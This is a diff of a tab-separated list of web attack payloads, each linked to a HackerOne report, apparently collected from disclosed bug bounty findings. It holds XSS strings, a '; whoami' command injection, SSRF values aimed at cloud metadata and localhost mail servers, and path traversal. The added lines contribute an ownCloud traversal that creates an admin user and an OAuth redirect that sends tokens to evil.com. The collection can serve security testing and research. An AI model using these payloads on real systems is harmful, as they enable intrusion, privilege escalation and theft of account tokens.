@@ -1077,6 +1077,10 @@ package ; whoami	https://hackerone.com/reports/1705717
 {"imapHost":"127.0.0.1","imapPort":<port_number>,"imapSslMode":"none","imapUser":"xxx@xxx.org","imapPassword":"xxx","smtpSslMode":"none","smtpUser":"xxx@xxx.org","smtpPassword":"xxx","accountName":"xxx@xxx.org","emailAddress":"xxx@xxx.org"}	https://hackerone.com/reports/1736390
 https://████████/fcgi-bin/release.py?project=aaa%3Ch1%20onauxclick=confirm(document.domain	https://hackerone.com/reports/1736432
 https://█████████/fcgi-bin/release.py?project=aaa%3Ch1%20onauxclick=confirm(document.domain	https://hackerone.com/reports/1736432
+path=/.\&userid=hacker&password=h4ck3rPassw0Rd!&displayName=hacker&email=mail@example.com&groups[]=admin&\..\.owncloudsync.log	https://hackerone.com/reports/1741430
+nc://open/admin@pentest.cloud.wtf/.\&userid=hacker&password=h4ck3rPassw0Rd!&displayName=hacker&email=mail@example.com&groups[]=admin&\..\.owncloudsync.log?token=../../../../../../../ocs/v1.php/cloud/users	https://hackerone.com/reports/1741430
+?token=../../../../../../../ocs/v1.php/cloud/users	https://hackerone.com/reports/1741430
+.\&userid=hacker&password=h4ck3rPassw0Rd!&displayName=hacker&email=mail@example.com&groups[]=admin&\..\.owncloudsync.log	https://hackerone.com/reports/1741430
 {"imapHost":"target.com","imapPort":993,"imapSslMode":"ssl","imapUser":"redacted","imapPassword":"redacter","smtpHost":"127.0.0.1","smtpPort":8080,"smtpSslMode":"none","smtpUser":"xx","smtpPassword":"xx","accountName":"Test1","emailAddress":"xxx@xxx.org"}	https://hackerone.com/reports/1746582
 http://169.254.169.254\@geonode.target.com	https://hackerone.com/reports/1747596
 http://169.254.169.254\/@geonode.target.com	https://hackerone.com/reports/1747596
@@ -1105,6 +1109,7 @@ https://██████████/████/login/downloadForm?filename=
 sftp://host/~a../other/file	https://hackerone.com/reports/1892351
 https://target.com/cloudsql-proxy/../swordlight/load_my_evil_dag.py?a=/cloud_sql_proxy.linux.amd64	https://hackerone.com/reports/1895316
 <iframe onload=alert(document.domail)>	https://hackerone.com/reports/1901706
+https://target.com/site/oauth2/authorize?client_id=b9jLmh8WCLZPBAwWba&redirect_uri=https%3A%2F%2Fevil.com%2Fusers%2Fauth%2Fbitbucket%2Fcallback&response_type=token&state=DoesNotMatter	https://hackerone.com/reports/1923672
 <img src=x onerror=alert(/Stored_XSS/)>	https://hackerone.com/reports/1940788
 <script>alert('Javascript is executed.')</script>	https://hackerone.com/reports/1941767
 http://localhost:3000/vuln?redirect_url=javascript:alert()%08	https://hackerone.com/reports/1955370
